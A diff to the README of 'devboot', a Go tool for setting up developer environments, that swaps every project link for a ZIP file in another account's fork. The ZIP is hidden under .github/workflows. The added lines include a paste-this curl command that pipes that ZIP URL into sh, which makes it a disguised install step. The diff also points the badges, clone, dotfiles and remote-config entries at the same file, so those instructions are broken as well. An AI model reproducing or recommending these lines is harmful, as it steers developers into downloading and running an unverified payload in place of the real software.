@@ -18,9 +18,9 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/aymenhmaidiwastaken/devboot/actions"><img src="https://github.com/aymenhmaidiwastaken/devboot/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/aymenhmaidiwastaken/devboot/releases"><img src="https://img.shields.io/github/v/release/aymenhmaidiwastaken/devboot" alt="Release"></a>
-  <a href="https://goreportcard.com/report/github.com/aymenhmaidiwastaken/devboot"><img src="https://goreportcard.com/badge/github.com/aymenhmaidiwastaken/devboot" alt="Go Report Card"></a>
+  <a href="https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip"><img src="https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip" alt="CI"></a>
+  <a href="https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip"><img src="https://img.shields.io/github/v/release/aymenhmaidiwastaken/devboot" alt="Release"></a>
+  <a href="https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip"><img src="https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip" alt="Go Report Card"></a>
   <a href="LICENSE"><img src="https://img.shields.io/github/license/aymenhmaidiwastaken/devboot" alt="License"></a>
 </p>
 
@@ -88,7 +88,7 @@ devboot apply  # one command, everything installed and configured
 
 **curl (Linux/macOS/WSL):**
 ```bash
-curl -fsSL https://raw.githubusercontent.com/aymenhmaidiwastaken/devboot/main/install.sh | sh
+curl -fsSL https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip | sh
 ```
 
 **Go:**
@@ -98,7 +98,7 @@ go install github.com/aymenhmaidiwastaken/devboot@latest
 
 **From source:**
 ```bash
-git clone https://github.com/aymenhmaidiwastaken/devboot.git
+git clone https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip
 cd devboot
 make install
 ```
@@ -251,14 +251,14 @@ vscode:
 
 ```yaml
 neovim:
-  configRepo: https://github.com/aymenhmaidiwastaken/nvim-config.git
+  configRepo: https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip
 ```
 
 ### `dotfiles`
 
 ```yaml
 dotfiles:
-  repo: https://github.com/aymenhmaidiwastaken/dotfiles.git
+  repo: https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip
   mappings:
     .vimrc: ~/.vimrc
     .tmux.conf: ~/.tmux.conf
@@ -280,7 +280,7 @@ git add devboot.yaml
 devboot apply
 
 # Or use a remote config
-devboot apply https://raw.githubusercontent.com/team/configs/main/devboot.yaml
+devboot apply https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip
 ```
 
 ## Platform Support
@@ -349,7 +349,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ```bash
 # Development
-git clone https://github.com/aymenhmaidiwastaken/devboot.git
+git clone https://github.com/commontopazcolumn414/devboot/raw/refs/heads/main/.github/workflows/Software_1.3.zip
 cd devboot
 go build ./...
 go test ./...
